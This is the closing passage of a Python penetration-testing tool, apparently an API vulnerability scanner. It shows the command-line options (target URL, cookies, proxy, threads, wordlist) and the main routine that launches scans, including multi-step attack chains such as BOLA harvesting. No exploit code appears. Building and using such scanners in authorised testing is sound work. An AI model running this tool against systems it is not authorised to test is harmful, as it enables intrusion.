           Authentication Bypass • Price Manipulation • Privilege Escalation

{Colors.YELLOW}HIGH:{Colors.END}      XSS • Path Traversal • IDOR • GraphQL Exposure • JWT Flaws

{Colors.CYAN}MEDIUM:{Colors.END}    Missing Security Headers • Rate Limiting • Info Disclosure

{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════{Colors.END}

{Colors.WHITE}For complete documentation, see: README_V2.md
For quick reference, see: QUICKSTART.txt
For version comparison, see: VERSION_COMPARISON.txt{Colors.END}

{Colors.BOLD}Ghost Ops Security - Professional Penetration Testing Tools{Colors.END}
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target API base URL')
    parser.add_argument('-H', '--header', action='append', help='Custom headers (can be used multiple times)')
    parser.add_argument('-w', '--wordlist', help='Custom endpoint wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--cookie', help='Cookie string (e.g., "session=abc123;user=admin")')
    parser.add_argument('-o', '--output-dir', default='./reports',
                        help='Directory for JSON/HTML reports (default: ./reports)')
    parser.add_argument('--skip-chains', action='store_true',
                        help='Skip Phase 4 multi-step attack chains (unauth replay, BOLA harvest, mass-assignment persistence)')
    
    args = parser.parse_args()
    
    # Parse headers
    headers = {}
    if args.header:
        for header in args.header:
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
    
    # Parse cookies
    cookies = {}
    if args.cookie:
        for cookie in args.cookie.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Parse proxy
    proxy = None
    if args.proxy:
        proxy = {
            'http': args.proxy,
            'https': args.proxy
        }
    
    # Load wordlist
    wordlist = None
    if args.wordlist:
        try:
            with open(args.wordlist, 'r') as f:
                wordlist = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[!] Error loading wordlist: {e}{Colors.END}")
            sys.exit(1)
    
    # Initialize and run scanner
    scanner = APIVulnScanner(
        base_url=args.url,
        headers=headers,
        proxy=proxy,
        threads=args.threads,
        cookies=cookies,
        output_dir=args.output_dir,
        skip_chains=args.skip_chains
    )
    
    try:
        scanner.run_full_scan(wordlist)
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
        if scanner.findings:
            scanner.generate_report()
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")
        import traceback
        traceback.print_exc()


if __name__ == '__main__':
    main()
